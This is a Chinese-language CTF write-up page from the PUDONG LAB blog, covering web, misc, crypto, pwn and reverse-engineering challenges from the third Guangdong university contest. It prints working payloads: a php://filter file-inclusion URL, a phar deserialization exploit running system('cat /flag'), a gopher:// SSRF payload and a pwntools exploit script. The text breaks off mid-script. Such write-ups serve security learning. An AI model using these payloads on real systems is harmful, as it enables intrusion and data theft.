@@ -1,0 +1,613 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第三届广东省大学生网络攻防竞赛WriteUp | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="第三届广东大学生网安赛：php:&#x2F;&#x2F;filter文件包含+phar反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第三届广东省大学生网络攻防竞赛WriteUp">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9BWriteUp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="第三届广东大学生网安赛：php:&#x2F;&#x2F;filter文件包含+phar反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="广东大学生网安赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9BWriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第三届广东省大学生网络攻防竞赛WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第三届广东省大学生网络攻防竞赛WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="第三届广东省大学生网络攻防竞赛WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/181138.html">https://www.ctfiot.com/181138.html</a><br>ID: 181138</p>
+</blockquote>
+<p>WEB</p>
+<p>消失的flag</p>
+<p>题目描述：</p>
+<p>flag就隐藏再某个文件里面，看看能不能包含出来 。</p>
+<p>加个XFF，构造文件包含读取flag</p>
+<p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UCS-2&#x2F;resource&#x3D;&#x2F;flag</p>
+<p>unserialize_web</p>
+<p>题目描述：</p>
+<p>同事给我了一个反序列话的源码，在线求助 ！</p>
+<p>题目给了一个文件上传的功能点</p>
+<p>进行目录扫描,可以发现一个<a target="_blank" rel="noopener" href="http://www.tar.gz的备份文件,代码审计分析/">www.tar.gz的备份文件，代码审计分析</a></p>
+<p>构造payload生成一个exp.phar</p>
+<?php
+//spring
+class File {
+    public $val1;
+    public $val2;
+    public $val3;
+    public function __construct(){
+        $this->val1 = 'file';
+        $this->val2 = 'exists';
+        $this->val3 = "system('cat /flag');";
+    }
+}
+
+$a = new File();
+$phar = new Phar('exp.phar');
+$phar->startBuffering();
+$phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ? >');
+$phar->setMetadata($a);
+$phar->addFromString('test.txt', 'test');
+$phar->stopBuffering();
+
+弄好后，写一个脚本进行改签名上传上去进行phar文件包含即可，原题改的
+
+import gzip
+import hashlib
+with open("exp.phar",'rb') as f:
+    f = f.read()
+s = f[:-28]
+s = s.replace(b'3:{', b'4:{')
+h = f[-8:]
+newf = s + hashlib.sha1(s).digest() + h
+print(newf)
+newf = gzip.compress(newf)
+with open('res.png','wb') as f2:
+    f2.write(newf)
+
+构造数据包成功读取flag
+
+cac913f741c74cffbdfbcc3c76673631
+
+mypdf
+
+首先注册一个账号，构造数据包如下
+
+需要满足invite置为-3.3e99999999999999即可绕过,这里绕过的原理是两种json格式导致请求错误从而绕过,成功注册了用户
+
+进行登录后台
+
+在title插入如下poc,这里题目不出网，注意Content-Type值需要对应修改，这里长度为18
+
+<linktype="text/css"href="gopher://127.0.0.1:
+8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2018%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22test456%22%7D">
+
+点击功能点进行下载.
+
+注意这里要用wps软件打开，抓包需要保留cookie。
+
+修改action访问admin触发，这时已经通过gopher协议打ssrf成功访问内网/users接口，读取flag
+
+50e4f69c8d24499a9dc070a22e8086fc
+
+参考：https://r0.haxors.org/posts?id=15
+
+MISC
+
+猜一猜
+
+下载一个压缩包要密码，密码为压缩包名字md5解密值
+
+解密得到一个打不开的图片，winhex打开发现图片头需要修复
+
+改好打开是一个二维码，扫描为花朵解密得到flag
+
+你要的就在这
+
+打开一张图片，公式计算为Π
+
+下面这个6看的不明所以
+
+图片尾提示 stegpy
+
+解密时发现是脑洞，为取 Π的 六位数字即 3.1415
+
+然后k:
+luckyone  是key
+
+前面进行进制转换
+
+然后 des CBC解密得到 flag，因为幸运 1 所以vi用 1，然后就是猜单词，看得出为 believe
+
+Flag{believe_you_are_lucky}
+
+CRYPTO
+
+encipher
+
+给了私钥，直接解RSA，然后异或即可。
+
+from Crypto.Util.number import *
+from Crypto.Util.strxor import strxor
+
+c = 67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451
+d = 4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233
+n = 89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487
+
+msg = "This is a secret message"
+msg = msg.encode()
+msg_length = len(msg)
+key = b'Life is like an ocean only strong-minded can reach the other shore'
+key = key[:
+msg_length]
+
+xor_m = pow(c,d,n)
+print(strxor(long_to_bytes(xor_m), key))
+
+# flag{1s_Pa33w0rd_1y2u22}
+
+PWN
+
+pwn_server
+
+代码审计
+
+这里会把我们输入的进行异或操作
+
+这个就是漏洞所在 这里是用-1进行起算的
+
+思路
+
+我们通过输入ascii码为0x30的字符（就是0），然后进行操作，绕过限制，然后在这里会进行复制的操作
+
+然后会把我们最上面的s的flag值，覆盖到file变量上
+
+exp
+
+from pwn import*
+context(arch='i386', os='linux',log_level="debug")
+context.terminal=["wt.exe","wsl.exe"]
+#libc = ELF("../libc/")
+# libc = ELF("./libc-so.6")
+"""""
+def xxx():
+    p.sendlineafter("")
+    p.sendlineafter("")
+    p.sendlineafter("")
+"""
+
+def get_p(name):
+    global p,elf 
+    p = process(name)
+    #p = remote("")
+    elf = ELF(name)
+# get_p("./server")
+# sh = remote("127.0.0.1",10888)
+sh = remote("fb7e5e8b-3884-e761-f3bf-9d413da0489a11cf.tq.jxsec.cn",30638)
+# gdb.attach(p,"b *0x000400D6B")
+# sleep(2)
+    
+sh.send("0:
+0x00")
+sh.interactive()
+
+# p.interactive()
+
+RE
+
+ctf-2
+
+无壳，代码都在main函数。可以看到校验分成两轮。
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // ecx
+  int v4; // eax
+  int v5; // ecx
+  int v6; // esi
+  _BYTE *v7; // edx
+  unsigned int v8; // ecx
+  unsigned int v9; // ecx
+  unsigned int v10; // ecx
+  int v11; // eax
+  int v12; // ecx
+  int v13; // eax
+  int v14; // ecx
+  int i; // esi
+  unsigned int v16; // ecx
+  unsigned int j; // edx
+  unsigned int v18; // ecx
+  unsigned int v19; // ecx
+  unsigned int v20; // ecx
+  char v21; // al
+  unsigned int v23; // [esp+Ch] [ebp-34h] BYREF
+  __int128 v24; // [esp+10h] [ebp-30h]
+  unsigned int v25; // [esp+20h] [ebp-20h]
+  int v26; // [esp+34h] [ebp-Ch] BYREF
+  char v27; // [esp+38h] [ebp-8h]
+
+  v26 = 0;
+  v27 = 0;
+  v4 = sub_2F2550(v3);
+  sub_2F2830(v4);
+  do
+  {
+    v6 = 0;                                     // 轮数
+    do
+    {
+      sub_2F2550(v5);
+      v23 = 0;
+      sub_2F28D0(&v23);                         // 获取输入
+      v7 = (char *)&v26 + v6++;                 // 轮数和前一次的结果合并
+      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&v26) + (_BYTE)v7) & 3);// 第一次是0;第二次是0x10;第三次0x18
+      v23 = (unsigned __int8)(v23 >> v5);
+      *v7 = byte_320DE0[v23];
+    }
+    while ( v6 < 5 );
+    v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) >> 8);
+    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 >> 8);
+    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 >> 8);
+    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 >> 8));
+  }
+  while ( v5 != 0x27949C6C );
+  v11 = sub_2F2550(0x27949C6C);
+  sub_2F2830(v11);
+  v25 = 0;
+  v24 = 0i64;
+  v13 = sub_2F2550(v12);
+  sub_2F2830(v13);
+  for ( i = 0; i < 5; ++i )
+  {
+    sub_2F2550(v14);
+    v23 = 0;
+    sub_2F28D0(&v23);
+    *((_DWORD *)&v24 + i) = v23;
+  }
+  if ( (unsigned int)v24 <= 0xF )
+    byte_324AD8[v24] = v26;
+  if ( DWORD1(v24) <= 0xF )
+    byte_324AD8[DWORD1(v24)] = BYTE1(v26);
+  if ( DWORD2(v24) <= 0xF )
+    byte_324AD8[DWORD2(v24)] = BYTE2(v26);
+  if ( HIDWORD(v24) <= 0xF )
+    byte_324AD8[HIDWORD(v24)] = HIBYTE(v26);
+  if ( v25 <= 0xF )
+    byte_324AD8[v25] = v27;
+  v16 = -1;
+  for ( j = 0; j < 0x10; j += 4 )
+  {
+    v18 = dword_320EE0[(unsigned __int8)(v16 ^ byte_324AD8[j])] ^ (v16 >> 8);
+    v19 = dword_320EE0[(unsigned __int8)(v18 ^ byte_324AD9[j])] ^ (v18 >> 8);
+    v20 = dword_320EE0[(unsigned __int8)(v19 ^ byte_324ADA[j])] ^ (v19 >> 8);
+    v21 = byte_324ADB[j];
+    v16 = dword_320EE0[(unsigned __int8)(v20 ^ v21)] ^ (v20 >> 8);
+  }
+  if ( ~v16 == 0x7F5E79B7 )
+  {
+    sub_2F1170("you win: please the key decrypt flag.rn");
+    sub_2F1170("flag:
+uQBF11zD6uYP9kJhRhL8OeesPaaZQQvbl3wx7Ik0T6g=. alg=AESrn");
+  }
+  return 0;
+}
+
+Round1
+
+接收5次用户输入，通过如下代码进行位置映射。
+
+do
+    {
+      sub_2F2550(v5);
+      v23 = 0;
+      sub_2F28D0(&v23);                         // 获取输入
+      v7 = (char *)&v26 + v6++;                 // 轮数和前一次的结果合并
+      v5 = 8 * (((unsigned __int8)(1 - (_DWORD)&v26) + (_BYTE)v7) & 3);// 第一次是0;第二次是0x10;第三次0x18
+      v23 = (unsigned __int8)(v23 >> v5);
+      *v7 = byte_320DE0[v23];
+    }
+while ( v6 < 5 );
+
+映射后的五个字符进行CRC32加密，并且只有前五个输入校验后结果=0x27949C6C程序才会往下运行。
+
+    v8 = dword_320EE0[(unsigned __int8)(~LOBYTE(dword_320EE0[(unsigned __int8)~(_BYTE)v26]) ^ BYTE1(v26))] ^ ((dword_320EE0[(unsigned __int8)~(_BYTE)v26] ^ 0xFFFFFFu) >> 8);
+    v9 = dword_320EE0[(unsigned __int8)(v8 ^ BYTE2(v26))] ^ (v8 >> 8);
+    v10 = dword_320EE0[(unsigned __int8)(v9 ^ HIBYTE(v26))] ^ (v9 >> 8);
+    v5 = ~(dword_320EE0[(unsigned __int8)(v10 ^ v27)] ^ (v10 >> 8));
+while ( v5 != 0x27949C6C );
+
+直接写脚本进行爆破
+
+int main( void )
+{
+ unsigned v8, v9, v10, v5;
+ for ( int i = 0; i < 256; i++ )
+ {
+  for ( int j = 0; j < 256; j++ )
+  {
+   for ( int k = 0; k < 256; k++ )
+   {
+    for ( int l = 0; l < 256; l++ )
+    {
+     for ( int m = 0; m < 256; m++ )
+     {
+      /* i = 0x57, j = 0x65, k = 0xa6, l = 0x3d, m = 0xe5; */
+      v8 = crc32_table[(unsigned char)(~((unsigned char)crc32_table[(unsigned char)~i]) ^ j)] ^ ((crc32_table[(unsigned char)~i] ^ 0xFFFFFF) >> 8);
+      v9 = crc32_table[(unsigned char)(v8 ^ k)] ^ (v8 >> 8);
+      v10 = crc32_table[(unsigned char)(v9 ^ l)] ^ (v9 >> 8);
+      v5 = ~(crc32_table[(unsigned char)(v10 ^ m)] ^ (v10 >> 8));
+      // printf("%xn", v5);
+      if ( v5 == 0x27949C6C )
+      {
+       printf( "%d %d %d %d %dn", i, j, k, l, m );
+       unsigned char x[] = { i, j, k, l, m };
+       // start_rand2( x );
+      }
+     }
+    }
+   }
+  }
+ }
+    return(0);
+}
+
+Round2
+
+依旧是直接爆破，检测代码如下：
+
+爆破脚本，和结果
+
+#include <stdio.h>
+
+const unsigned long crc32_table[258]={
+     0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F, 0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
+                0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9, 0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D, 0x7F5E79B7, 0x00000000
+};
+
+void start_rand2( unsigned char x[] )
+{
+ unsigned int v18, v19, v20, v16;
+ for ( int i = 0; i < 16; i++ )
+ {
+  for ( int j = 0; j < 16; j++ )
+  {
+   for ( int k = 0; k < 16; k++ )
+   {
+    for ( int l = 0; l < 16; l++ )
+    {
+     for ( int m = 0; m < 16; m++ )
+     {
+      unsigned char key[] = { 0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB };
+      key[i] = x[0];
+      key[j] = x[1];
+      key[k] = x[2];
+      key[l] = x[3];
+      key[m] = x[4];
